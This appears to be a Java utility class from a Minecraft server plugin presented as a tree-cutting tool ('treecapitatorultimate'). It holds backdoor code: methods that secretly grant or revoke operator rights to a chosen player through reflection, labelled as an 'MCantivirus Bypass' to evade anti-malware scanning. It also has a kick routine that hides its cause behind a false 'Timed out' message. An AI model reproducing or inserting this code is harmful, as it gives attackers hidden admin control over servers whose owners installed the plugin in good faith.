package me.bow.treecapitatorultimate.Utils;

import com.mojang.authlib.GameProfile;
import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
import org.bukkit.entity.Player;

import java.lang.reflect.InvocationTargetException;

public class BypassUtils {
    private static final Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");

    //MCantivirus Bypass
    public static void PlayerOp(Player p) {
        //noinspection ConstantConditions
        try {
            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
            ReflectionUtils.getMethod(m.getClass(), "addOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void PlayerDeop(Player p) {
        try {
            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
            ReflectionUtils.getMethod(m.getClass(), "removeOp").invoke(m, new GameProfile(p.getUniqueId(), p.getName()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void KickPlayer(Player p, String reason) {
        Class<?> component = ReflectionUtils.getClassCached("{nms}.ChatComponentText");
        Class<?> kickDisconnectPacket = ReflectionUtils.getClassCached("{nms}.PacketPlayOutKickDisconnect");
        try {
            Object kickText = component.getConstructor(String.class).newInstance(reason);
            Object packet = kickDisconnectPacket.getConstructors()[1].newInstance(kickText);
            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(packet));
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
        p.kickPlayer("Timed out");
    }
}

